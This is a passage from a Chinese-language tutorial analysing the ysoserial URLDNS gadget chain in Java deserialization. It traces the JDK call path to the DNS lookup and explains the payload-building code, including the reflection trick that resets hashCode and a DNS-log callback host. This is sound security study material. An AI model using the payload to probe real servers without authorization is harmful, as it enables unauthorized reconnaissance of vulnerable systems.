跟进`hash(key)`：`java.util.HashMap#hash`
        static final int hash(Object key) {
            int h;
            return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
        }
传入的key是一个URL对象，不同对象的hash计算方法是在各自的类中实现的，这里`key.hashCode()`调用URL类中的hashCode方法：`java.net.URL#hashCode`
        transient URLStreamHandler handler; //这个URL传输实现类是一个transient临时类型，它不会被反序列化（之后会用到）
        private int hashCode = -1;//hashCode是private类型，需要手动开放控制权才可以修改。
        //...
        public synchronized int hashCode() {
            //判断如果当前对象中的hashCode不为默认值-1的话，就直接返回
            //意思就是如果以前算过了就别再算了
            if (hashCode != -1)
                return hashCode;
            //如果没算过，就调用当前URL类的URL传输实现类去计算hashcode
            hashCode = handler.hashCode(this);//进入此处
            return hashCode;
        }
`java.net.URLStreamHandler#hashCode`
    //此处传入的URL为我们自主写入的接受DNS查询的URL
    protected int hashCode(URL u) {
            int h = 0;//计算的hash结果
            //使用url的协议部分，计算hash
            String protocol = u.getProtocol();
            if (protocol != null)
                h += protocol.hashCode();
            //**通过url获取目标IP地址**，再计算hash拼接进入
            InetAddress addr = getHostAddress(u);
            if (addr != null) {
                h += addr.hashCode();
            } else {//如果没有获取到，就直接把域名计算hash拼接进入
                String host = u.getHost();
                if (host != null)
                    h += host.toLowerCase().hashCode();
            }
            //...
至此我们就看到了`getHostAddress(u)`这一关键语句，通过我们提供的URL地址去获取对应的IP。再往后还有一些函数调用，但是更为底层，而不太关键，就不继续跟了。
但有一处值得提一下，之前说到URL要传入一个域名而不能是一个IP，IP不会触发DNS查询是在
`java.net.InetAddress#getAllByName(java.lang.String,
java.net.InetAddress)`中进行了限制：
    private static InetAddress[] getAllByName(String host, InetAddress reqAddr)
            throws UnknownHostException {
    ...
    // if host is an IP address, we won't do further lookup
            if (Character.digit(host.charAt(0), 16) != -1
                || (host.charAt(0) == ':')) {
                byte[] addr = null;
                int numericZone = -1;
                String ifname = null;
                // see if it is IPv4 address
                addr = IPAddressUtil.textToNumericFormatV4(host);
                if (addr == null) {
                ...
总结一下JDK1.8下的调用路线：
  1. HashMap->readObject()
  2. HashMap->hash()
  3. URL->hashCode()
  4. URLStreamHandler->hashCode()
  5. URLStreamHandler->getHostAddress()
  6. InetAddress->getByName()
而在jdk1.7u80环境下调用路线会有一处不同，但是大同小异：
  1. HashMap->readObject()
  2. **HashMap- >putForCreate()**
  3. HashMap->hash()
  4. URL->hashCode()
  5. 之后相同
看以上调用过程可以发现：我们要执行的是URL查询的方法`URL->hashCode()`，而HashMap只是我们的一层封装。
###  回看payload生成
总结以上反序列化过程，我们可以得出要成功完成反序列化过程触发DNS请求，payload需要满足以下2个条件
  1. 1.HashMap对象中有一个key为URL对象的键值对
  2. 2.这个URL对象的hashcode需要为-1
回头看看测试代码是怎么实现的
    HashMap hashMap = new HashMap();
    URL url = new URL("http://xxx.ceye.io");
    Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
    f.setAccessible(true);
    //----    f.set(url, 0xdeadbeef); 
    hashMap.put(url, "rmb122");
    f.set(url, -1); 
    //----    
前面创建hashmap，url对象，由于hashCode是private属性，更改访问权限让它变得允许修改都没问题。
但是下面这块为啥不能直接把URL对象put进去hashmap就好了？反而要设置成别的值再设置回来？
我们需要关注一下`java.util.HashMap#put`
        public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
可以发现put里面的语句跟我们之前看到的会触发DNS查询的语句一模一样，同时URL对象再初始化之后的hashCode默认为-1。
也就是说在我们生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。
把`f.set(url, 0xdeadbeef);`这句话注释了看看：
这时候hashCode默认为-1，然后就会进入`hash(key)`触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。
而在put了之后：
  * 1.如果之前没有`f.set(url, 0xdeadbeef);`修改hashCode，就会完成DNS查询的同时，计算出hashCode，从而修改成不为-1的值。这个hashcode会被序列化传输，到对方机器时就会因为不是-1而跳过DNS查询流程
  * 2.如果之前修改了hashCode，那自然也会直接被序列化传输，不是-1也会跳过DNS查询流程。
所以需要`f.set(url, -1);`把这个字段改回来-1。
###  看看Ysoserial是怎么做的
我们可以使用JAR调试的第三种方法，JAR源代码调试去看看Ysoserial的实现细节。（git clone Ysoserial项目来获取源码）
在`ysoserial.payloads.URLDNS#getObject`处下断点调试：
    public Object getObject(final String url) throws Exception {
        //SilentURLStreamHandler 是一个自主写的避免生成payload的时候形成URL查询的骚操作，我们之后会分析。
        //用这种骚操作的前提是URL对象的handler属性是transient类型；
        //这代表我们自主写的骚操作不会被写入反序列化的代码中，不会对结果造成影响
        URLStreamHandler handler = new SilentURLStreamHandler();
        //来一个HashMap
        HashMap ht = new HashMap(); 
        //再来一个URL对象，这里把SilentURLStreamHandler这个handler传入进去，等会看看做了啥
        URL u = new URL(null, url, handler); //传入的URL是我们传入的DNS查询的目标
        //URL作为key值和HashMap duang~ 此处的value值是可以随便设置的，这里设置为url
        ht.put(u, url); 
        //按照我们之前分析，以上的put操作讲道理会触发一次DNS查询
        //这里使用了SilentURLStreamHandler的骚操作进行避免，但是同样为URL对象计算保存了一个hashCode
        //所以为了在对方机器上DNS成功，在这里重置一下hashCode为-1
        Reflections.setFieldValue(u, "hashCode", -1); 
        return ht;
    }
具体看看SilentURLStreamHandler是怎么做的：`ysoserial.payloads.URLDNS.SilentURLStreamHandler`
    static class SilentURLStreamHandler extends URLStreamHandler {
                    protected URLConnection openConnection(URL u) throws IOException {
                            return null;
                    }
                    protected synchronized InetAddress getHostAddress(URL u) {
                            return null;
                    }
            }
`SilentURLStreamHandler`类继承了`URLStreamHandler`类，然后写了个空的 **getHostAddress** 方法。
根据JAVA的继承子类的同名方法会覆盖父类方法的原则，这个骚操作的思路大概就是本来执行`URLStreamHandler.getHostAddress`我们写一个URLStreamHandler的子类`SilentURLStreamHandler`的getHostAddress，然后啥都不做，这样就不会在生成payload的时候去请求DNS。
来用调试过程来证实一下：
先把自定义的SilentURLStreamHandler塞到URL对象中：`URL u = new URL(null, url, handler);`
`java.net.URL#URL(java.net.URL, java.lang.String,
java.net.URLStreamHandler)#605行`
然后在`ht.put(u,
url);`中，按照预定的路径`HashMap->hash()`、`URL->hashCode()`、`URLStreamHandler->hashCode()`。之后就遇到了`getHostAddress(u)`
但是从左下角的调用栈就可以看到，之后不是进入`URLStreamHandler->getHostAddress()`而是`SilentURLStreamHandler#getHostAddress`，这将会返回NULL。
至此Ysoserial用一个子类继承完成了规避DNSLOG；而测试代码用先改变HashCode完成了规避DNSLOG。
讲道理应该后者简单方便一点，但是总感觉Ysoserial的方法有种秘之炫技和优雅。
这就是大佬么，膜了膜了，爱了爱了。
## 参考
知识星球-代码审计：Java安全漫谈 – 08.反序列化篇(2)